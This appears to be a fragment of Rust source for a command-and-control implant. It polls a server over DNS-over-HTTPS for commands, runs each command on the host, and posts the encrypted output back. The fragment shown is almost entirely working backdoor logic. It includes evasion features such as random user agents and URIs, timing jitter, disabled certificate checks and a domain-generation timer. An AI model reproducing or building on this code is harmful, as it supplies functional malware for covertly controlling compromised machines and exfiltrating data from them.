            "{}\n{}\n{}",
            self.prepend_output,
            encrypted_output,
            self.append_output
        );

        let uri = self.pick_random_uri().to_string();
        let url = format!("{}/{}", self.server_url, uri.trim_start_matches('/'));

        #[derive(Serialize)]
        struct Payload<'a> {
            session_id: &'a str,
            output: &'a str,
            action: &'a str,
        }

        let payload = Payload {
            session_id: &session_id,
            output: &final_output,
            action: "submit",
        };

        let ua = self.pick_random_ua().to_string();

        let mut request = client
            .post(&url)
            .json(&payload)
            .header("User-Agent", ua)
            .header("Content-Type", "application/json");

        for (k, v) in &self.post_client_headers {
            request = request.header(k, v);
        }

        match request.send().await {
            Ok(r) => r.status().is_success(),
            Err(_) => false,
        }
    }

    async fn run(&mut self) {
        let client = reqwest::Client::builder()
            .danger_accept_invalid_certs(true)
            .build()
            .expect("Failed to build HTTP client");

        if !self.fetch_server_public_key(&client).await {
            return;
        }

        if !self.establish_session(&client).await {
            return;
        }

        loop {
            match self.send_doh_query(&client).await {
                Some(cmd) => {
                    let cmd_clone = cmd.clone();
                    let response = tokio::task::spawn_blocking(move || {
                        Self::execute_command(&cmd_clone)
                    })
                    .await
                    .unwrap_or_else(|e| format!("ERROR: {}", e));

                    self.send_output(&client, &response).await;
                }
                None => {}
            }

            self.apply_jitter().await;
        }
    }
}

#[tokio::main]
async fn main() {
    let mut client = DohClient::new(SERVER_URL, ID_TOKEN, DGA_TIMER_SECS);
    client.run().await;
}
